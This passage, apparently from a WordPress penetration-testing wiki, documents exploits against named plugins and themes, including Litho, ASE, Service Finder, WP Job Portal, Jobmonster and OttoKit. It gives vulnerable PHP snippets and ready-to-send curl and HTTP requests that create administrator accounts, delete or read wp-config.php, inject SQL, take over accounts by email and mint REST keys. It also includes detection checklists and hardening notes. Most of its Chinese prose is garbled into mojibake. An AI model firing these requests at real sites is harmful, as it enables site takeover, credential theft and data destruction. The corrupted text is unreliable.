- Impact: æœªç»è®¤è¯å³å¯é€šè¿‡ core users REST route åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ï¼Œä»è€Œå®ç°æƒé™æå‡ä¸ºç®¡ç†å‘˜ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (å¼ºåˆ¶ä½¿ç”¨ç”¨æˆ· ID 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·)ã€‚
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„ header æ˜ å°„åˆ°è®¤è¯çŠ¶æ€å¹¶è·³è¿‡èƒ½åŠ›æ£€æŸ¥ã€‚
- WordPress core æœŸæœ›è¯¥è·¯ç”±å…·æœ‰ `create_users` èƒ½åŠ›ï¼›è¯¥æ’ä»¶åˆ©ç”¨ header ç›´æ¥è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ä»¥ç»•è¿‡æ­¤æ£€æŸ¥ã€‚

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­å…¬å¼€ AJAX å¤„ç†ç¨‹åºã€‚ å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ **å›è°ƒä¼šå˜ä¸ºæœªè®¤è¯è®¿å®¢å¯è®¿é—®**ï¼Œæ‰€ä»¥ä»»ä½•æ•æ„Ÿæ“ä½œè¿˜å¿…é¡»é¢å¤–å®ç°ï¼š

1. ä¸€ä¸ª **capability check**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä¸€ä¸ªä½¿ç”¨ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯çš„ **CSRF nonce**ï¼Œä»¥åŠ
3. **ä¸¥æ ¼çš„è¾“å…¥è¿‡æ»¤ / éªŒè¯**ã€‚

Litho å¤šç”¨é€”ä¸»é¢˜ (< 3.1) åœ¨ *Remove Font Family* åŠŸèƒ½ä¸­é—æ¼äº†è¿™ä¸‰é¡¹æ§åˆ¶ï¼Œæœ€ç»ˆéšåŒ…å‘å¸ƒäº†ä»¥ä¸‹ä»£ç ï¼ˆå·²ç®€åŒ–ï¼‰ï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
è¿™ä¸ªä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **æœªè®¤è¯è®¿é—®** â€“ å·²æ³¨å†Œ `wp_ajax_nopriv_` hookã€‚
* **æ²¡æœ‰ nonce / capability æ£€æŸ¥** â€“ ä»»ä½•è®¿å®¢éƒ½å¯ä»¥è®¿é—®è¯¥ endpointã€‚
* **æœªå¯¹è·¯å¾„è¿›è¡Œæ¸…ç†** â€“ ç”¨æˆ·æ§åˆ¶çš„ `fontfamily` å­—ç¬¦ä¸²è¢«æ‹¼æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸”æœªç»è¿‡è¿‡æ»¤ï¼Œå…è®¸ç»å…¸çš„ `../../` éå†ã€‚

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªå•ä¸€çš„ HTTP POST è¯·æ±‚åˆ é™¤ä½äº **uploads åŸºç›®å½•ä»¥ä¸‹**ï¼ˆé€šå¸¸ä¸º `<wp-root>/wp-content/uploads/`ï¼‰çš„ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

å…¶ä»–æœ‰é‡å¤§å½±å“çš„ç›®æ ‡åŒ…æ‹¬æ’ä»¶/ä¸»é¢˜çš„ `.php` æ–‡ä»¶ï¼ˆç”¨äºç ´åå®‰å…¨æ’ä»¶ï¼‰æˆ– `.htaccess` è§„åˆ™ã€‚

#### Detection checklist

* ä»»ä½•è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()`, ç­‰ï¼‰çš„ `add_action( 'wp_ajax_nopriv_...')` å›è°ƒã€‚
* å°†æœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°è·¯å¾„ä¸­çš„æƒ…å†µï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡å°†åŸå§‹è§’è‰²ä¿å­˜åœ¨ user meta ä¸­ä»¥ä¾¿ç¨åæ¢å¤ï¼Œæ¥å®ç°â€œä»¥è§’è‰²æŸ¥çœ‹â€æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ã€‚å¦‚æœæ¢å¤è·¯å¾„ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæ²¡æœ‰æ£€æŸ¥æƒé™èƒ½åŠ›å’Œæœ‰æ•ˆçš„ nonceï¼Œé‚£ä¹ˆè¿™ä¼šæˆä¸ºä¸€æ¬¡å‚ç›´æƒé™æå‡ã€‚

åœ¨å®é™…æ¡ˆä¾‹ä¸­ï¼Œåœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªä¾‹å­ã€‚reset åˆ†æ”¯åœ¨ç”¨æˆ·åå‡ºç°åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` æ—¶ï¼Œä¼šåŸºäº `reset-for=<username>` æ¢å¤è§’è‰²ï¼Œä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶ä» user meta `_asenha_view_admin_as_original_roles` é‡æ–°æ·»åŠ ä¿å­˜çš„è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰æ‰§è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰éªŒè¯ nonceï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œä¸€ä¸ªæ’ä»¶é€‰é¡¹ï¼Œä½†æ²¡æœ‰è¿›è¡ŒæœåŠ¡å™¨ç«¯æˆæƒã€‚
- å¦‚æœæŸç”¨æˆ·ä¹‹å‰çš„æ›´é«˜æƒé™ä¿å­˜åœ¨ `_asenha_view_admin_as_original_roles` ä¸­å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¥æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•å·²è®¤è¯ç”¨æˆ·éƒ½å¯ä»¥ä¸ºä»ä¿å­˜åœ¨ `viewing_admin_as_role_are` çš„å¦ä¸€ä¸ªç”¨æˆ·åè§¦å‘é‡ç½®ï¼ˆæˆæƒé”™è¯¯ï¼‰ã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸­ï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ å·²ä¿å­˜çš„åŸå§‹è§’è‰²ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œä»è€Œå®é™…ä¸Šæå‡æƒé™ã€‚

Detection checklist

- å¯»æ‰¾å°†â€œåŸå§‹è§’è‰²â€æŒä¹…åŒ–åˆ° user meta çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«æ‰§è¡Œé‡ç½®/æ¢å¤çš„è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ï¼š
  - ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
  - é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œä½†æœªä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
  - åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ“ä½œè€…çš„æƒé™èƒ½åŠ›ã€‚

---

### åœ¨å…¬å…± init é’©å­ä¸Šé€šè¿‡å— cookie ä¿¡ä»»çš„ç”¨æˆ·åˆ‡æ¢å®ç°çš„æœªè®¤è¯æƒé™æå‡ï¼ˆService Finder â€œsf-bookingâ€ï¼‰

æœ‰äº›æ’ä»¶ä¼šå°†ç”¨æˆ·åˆ‡æ¢çš„è¾…åŠ©å‡½æ•°æŒ‚åˆ°å…¬å…±çš„ `init` é’©å­ï¼Œå¹¶ä»å®¢æˆ·ç«¯å¯æ§çš„ cookie æ¨æ–­èº«ä»½ã€‚å¦‚æœä»£ç åœ¨æœªéªŒè¯èº«ä»½ã€æƒé™åŠæœ‰æ•ˆ nonce çš„æƒ…å†µä¸‹è°ƒç”¨ `wp_set_auth_cookie()`ï¼Œä»»ä½•æœªè®¤è¯çš„è®¿é—®è€…éƒ½å¯ä»¥å¼ºåˆ¶ä»¥ä»»æ„ç”¨æˆ· ID ç™»å½•ã€‚

å…¸å‹çš„æ˜“å—æ”»å‡»æ¨¡å¼ï¼ˆç®€åŒ–è‡ª Service Finder Bookings â‰¤ 6.1ï¼‰ï¼š
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ä¸ºä½•å¯è¢«åˆ©ç”¨

- å…¬å¼€çš„ `init` hook ä½¿å¾—å¤„ç†ç¨‹åºå¯¹æœªè®¤è¯çš„ç”¨æˆ·å¯è®¿é—®ï¼ˆæ²¡æœ‰ `is_user_logged_in()` ä¿æŠ¤ï¼‰ã€‚
- èº«ä»½æ¥è‡ªå®¢æˆ·ç«¯å¯ä¿®æ”¹çš„ cookieï¼ˆ`original_user_id`ï¼‰ã€‚
- ç›´æ¥è°ƒç”¨ `wp_set_auth_cookie($uid)` ä¼šå°†è¯·æ±‚è€…ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½ç™»å½•ï¼Œä¸”æ²¡æœ‰ä»»ä½• capability/nonce æ£€æŸ¥ã€‚

åˆ©ç”¨ï¼ˆæœªè®¤è¯ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF å¯¹ WordPress/plugin CVEs çš„è€ƒé‡

é€šç”¨çš„è¾¹ç¼˜/æœåŠ¡å™¨ WAF é€šå¸¸é’ˆå¯¹å¹¿æ³›æ¨¡å¼è¿›è¡Œè°ƒæ•´ï¼ˆSQLiã€XSSã€LFIï¼‰ã€‚è®¸å¤šé«˜å½±å“çš„ WordPress/plugin æ¼æ´æ˜¯ç‰¹å®šäºåº”ç”¨çš„é€»è¾‘/è®¤è¯ç¼ºé™·ï¼Œé™¤éå¼•æ“ç†è§£ WordPress è·¯ç”±å’Œæ’ä»¶è¯­ä¹‰ï¼Œå¦åˆ™è¿™äº›è¯·æ±‚çœ‹èµ·æ¥åƒæ­£å¸¸æµé‡ã€‚

æ”»å‡»ç«¯æ³¨æ„äº‹é¡¹

- é’ˆå¯¹æ’ä»¶ç‰¹å®šç«¯ç‚¹ä½¿ç”¨å¹²å‡€çš„ payloadsï¼š`admin-ajax.php?action=...`ã€`wp-json/<namespace>/<route>`ã€è‡ªå®šä¹‰æ–‡ä»¶å¤„ç†å™¨ã€shortcodesã€‚
- å…ˆå°è¯•æœªæˆæƒè·¯å¾„ï¼ˆAJAX `nopriv`ï¼ŒREST çš„å®½æ¾ `permission_callback`ï¼Œå…¬å¼€ shortcodesï¼‰ã€‚é»˜è®¤ payloads å¾€å¾€åœ¨ä¸æ··æ·†çš„æƒ…å†µä¸‹å°±èƒ½æˆåŠŸã€‚
- å…¸å‹çš„é«˜å½±å“åœºæ™¯ï¼šæƒé™æå‡ï¼ˆè®¿é—®æ§åˆ¶å¤±æ•ˆï¼‰ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½ã€LFIã€open redirectã€‚

é˜²å¾¡æ³¨æ„äº‹é¡¹

- ä¸è¦ä¾èµ–é€šç”¨çš„ WAF ç­¾åæ¥é˜²æŠ¤ plugin CVEsã€‚åº”å®ç°åº”ç”¨å±‚ã€é’ˆå¯¹æ¼æ´çš„è™šæ‹Ÿè¡¥ä¸æˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆé‡‡ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilitiesã€noncesã€ä¸¥æ ¼çš„è¾“å…¥éªŒè¯ï¼‰ï¼Œè€ŒéåŸºäºå¦å®šçš„ regex è¿‡æ»¤ã€‚

## WordPress é˜²æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€æ’ä»¶å’Œä¸»é¢˜å‡ä¸ºæœ€æ–°ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
å¦å¤–ï¼Œ**ä»…å®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- ç§»é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä¸”ä»…å…è®¸å†…éƒ¨æˆ–æŸäº› IP åœ°å€è®¿é—®ã€‚


### ç”±äºéªŒè¯ä¸è¶³å¯¼è‡´çš„æœªè®¤è¯ SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡æœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` ä¸­æ‰§è¡Œä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **æœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ¶ˆæ¯’** â€“ `parentid` ç›´æ¥æ¥è‡ª HTTP è¯·æ±‚ã€‚
2. **åœ¨ WHERE å­å¥ä¸­ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥** â€“ æœªä½¿ç”¨ `is_numeric()` / `esc_sql()` / é¢„å¤„ç†è¯­å¥ã€‚
3. **æ— éœ€è®¤è¯å³å¯è®¿é—®** â€“ è™½ç„¶è¯¥æ“ä½œé€šè¿‡ `admin-post.php` æ‰§è¡Œï¼Œä½†å”¯ä¸€çš„æ£€æŸ¥æ˜¯ä¸€ä¸ª **CSRF nonce** (`wp_verify_nonce()`)ï¼Œä»»ä½•è®¿é—®è€…éƒ½å¯ä»¥ä»åŒ…å« shortcode `[wpjobportal_my_resumes]` çš„å…¬å¼€é¡µé¢è·å–è¯¥ nonceã€‚

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonceï¼š
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQLï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”ä¼šæ³„éœ²è¢«æ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–ä¿®æ”¹æ•°æ®åº“ï¼Œä»è€Œè¯æ˜å­˜åœ¨ SQLiã€‚


### æœªç»è®¤è¯çš„ä»»æ„æ–‡ä»¶ä¸‹è½½ / è·¯å¾„éå† (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ï¼Œ **downloadcustomfile**ï¼Œå…è®¸è®¿å®¢é€šè¿‡è·¯å¾„éå†ä¸‹è½½ç£ç›˜ä¸Šçš„ **ä»»ä½•æ–‡ä»¶**ã€‚æ˜“å—æ”»å‡»çš„å…¥å£ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ç”±æ”»å‡»è€…æ§åˆ¶å¹¶åœ¨æ‹¼æ¥æ—¶**æœªç»è¿‡è¿‡æ»¤**ã€‚å†æ¬¡ï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯å¯ä»¥ä»ç®€å†é¡µé¢è·å–çš„ **CSRF nonce**ã€‚

#### åˆ©ç”¨
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨å“åº”åŒ…å« `wp-config.php` çš„å†…å®¹ï¼Œleaking DB credentials and auth keysã€‚

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

è®¸å¤š themes/plugins é€šè¿‡ admin-ajax.php æä¾› "social login" helpersã€‚å¦‚æœæœªè®¤è¯çš„ AJAX action (wp_ajax_nopriv_...) åœ¨ provider data ç¼ºå¤±æ—¶ä¿¡ä»»å®¢æˆ·ç«¯æä¾›çš„æ ‡è¯†ç¬¦ï¼Œå¹¶éšåè°ƒç”¨ wp_set_auth_cookie()ï¼Œåˆ™ä¼šå¯¼è‡´å®Œå…¨çš„èº«ä»½éªŒè¯ç»•è¿‡ã€‚

å…¸å‹çš„æœ‰ç¼ºé™·çš„æ¨¡å¼ï¼ˆç®€åŒ–ï¼‰
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- å¯ä»¥é€šè¿‡ admin-ajax.phpï¼ˆwp_ajax_nopriv_â€¦ actionï¼‰åœ¨ unauthenticated çŠ¶æ€ä¸‹è®¿é—®ã€‚
- åœ¨çŠ¶æ€æ”¹å˜ä¹‹å‰æ²¡æœ‰ nonce/capability æ£€æŸ¥ã€‚
- ç¼ºå°‘ OAuth/OpenID provider éªŒè¯ï¼›é»˜è®¤åˆ†æ”¯æ¥å—æ”»å‡»è€…è¾“å…¥ã€‚
- get_user_by('email', $_POST['id']) éšåè°ƒç”¨ wp_set_auth_cookie($uid) ä¼šå°†è¯·æ±‚è€…è®¤è¯ä¸ºä»»ä½•ç°æœ‰çš„é‚®ç®±åœ°å€ã€‚

Exploitation (unauthenticated)

- å‰ææ¡ä»¶ï¼šæ”»å‡»è€…å¯ä»¥è®¿é—® /wp-admin/admin-ajax.php å¹¶çŸ¥é“æˆ–çŒœåˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·é‚®ç®±ã€‚
- å°† provider è®¾ç½®ä¸ºä¸å—æ”¯æŒçš„å€¼ï¼ˆæˆ–çœç•¥ï¼‰ä»¥è§¦å‘é»˜è®¤åˆ†æ”¯ï¼Œå¹¶ä¼ é€’ id=<victim_email>ã€‚
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- ä¸è¦ä»å®¢æˆ·ç«¯è¾“å…¥æ¨å¯¼èº«ä»½ã€‚åªæ¥å—æ¥æºäºå·²éªŒè¯ provider token/ID çš„ emails/IDsã€‚
- å³ä½¿æ˜¯ login helpersï¼Œä¹Ÿè¦è¦æ±‚ CSRF nonces å’Œ capability checksï¼›é™¤éç»å¯¹å¿…è¦ï¼Œé¿å…æ³¨å†Œ wp_ajax_nopriv_ã€‚
- åœ¨æœåŠ¡å™¨ç«¯éªŒè¯å¹¶æ ¸å® OAuth/OIDC å“åº”ï¼›æ‹’ç»ç¼ºå¤±/æ— æ•ˆçš„ providersï¼ˆä¸è¦å›é€€åˆ° POST idï¼‰ã€‚
- åœ¨ä¿®å¤å‰ï¼Œè€ƒè™‘ä¸´æ—¶ç¦ç”¨ social login æˆ–åœ¨è¾¹ç¼˜è¿›è¡Œè™šæ‹Ÿè¡¥ä¸ï¼ˆé˜»æ­¢æ˜“å—æ”»å‡»çš„ actionï¼‰ã€‚

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ä¸€äº›æ’ä»¶å…¬å¼€äº† REST endpointsï¼Œä¼šåœ¨æœªéªŒè¯è°ƒç”¨è€…æƒé™çš„æƒ…å†µä¸‹é“¸é€ å¯é‡ç”¨çš„ â€œconnection keysâ€ æˆ– tokensã€‚å¦‚æœè¯¥è·¯ç”±ä»…åŸºäºå¯çŒœæµ‹çš„å±æ€§ï¼ˆä¾‹å¦‚ usernameï¼‰è¿›è¡Œè®¤è¯ï¼Œä¸”æ²¡æœ‰å°†å¯†é’¥ç»‘å®šåˆ°å¸¦æœ‰ capability checks çš„ç”¨æˆ·/ä¼šè¯ï¼Œä»»ä½•æœªè®¤è¯çš„æ”»å‡»è€…éƒ½å¯ä»¥é“¸é€ å¯†é’¥å¹¶è°ƒç”¨ç‰¹æƒæ“ä½œï¼ˆåˆ›å»º admin è´¦æˆ·ã€æ’ä»¶æ“ä½œ â†’ RCEï¼‰ã€‚

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ é“¸é€ ä¸€ä¸ª connection key å¹¶ä½¿ç”¨å®ƒ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨
- æ•æ„Ÿçš„ REST è·¯ç”±ä»…é€šè¿‡ä½ç†µçš„èº«ä»½è¯æ˜ï¼ˆç”¨æˆ·åï¼‰ä¿æŠ¤ï¼Œæˆ–ç¼ºå°‘ permission_callback
- æœªè¿›è¡Œ capability å¼ºåˆ¶æ£€æŸ¥ï¼›ç”Ÿæˆçš„å¯†é’¥è¢«å½“ä½œé€šç”¨ç»•è¿‡å‡­è¯

Detection checklist
- åœ¨æ’ä»¶ä»£ç ä¸­ grep å¯»æ‰¾ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
